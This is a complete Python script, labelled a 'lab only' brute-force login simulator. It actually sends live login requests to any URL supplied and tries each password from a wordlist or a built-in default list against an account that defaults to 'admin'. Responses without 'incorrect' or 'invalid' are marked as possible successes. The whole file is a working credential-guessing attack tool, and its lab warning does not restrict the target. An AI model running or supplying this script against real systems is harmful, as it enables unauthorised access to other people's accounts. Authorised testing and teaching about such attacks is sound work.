#!/usr/bin/env python3
"""
Brute-force Login Simulator - LAB ENVIRONMENT ONLY
Simulates login attempts for educational/authorized testing.
"""

import requests
import argparse
import sys

def simulate_login(url, username, password_list, method='POST'):
    results = []
    for pwd in password_list:
        try:
            if method == 'POST':
                r = requests.post(url, data={'username': username, 'password': pwd}, timeout=5)
            else:
                r = requests.get(url, params={'user': username, 'pass': pwd}, timeout=5)
            if r.status_code == 200 and 'incorrect' not in r.text.lower() and 'invalid' not in r.text.lower():
                results.append((pwd, 'possible success'))
            else:
                results.append((pwd, 'fail'))
        except Exception as e:
            results.append((pwd, str(e)))
    return results

def main():
    p = argparse.ArgumentParser(description="LAB USE - Brute-force login simulator")
    p.add_argument('url')
    p.add_argument('-u', '--user', default='admin')
    p.add_argument('-w', '--wordlist', default=None)
    args = p.parse_args()
    words = open(args.wordlist).read().splitlines() if args.wordlist else ['password','admin','123456','letmein']
    print("[!] LAB USE ONLY")
    for pwd, status in simulate_login(args.url, args.user, words):
        print(f"  {pwd}: {status}")

if __name__ == '__main__':
    main()
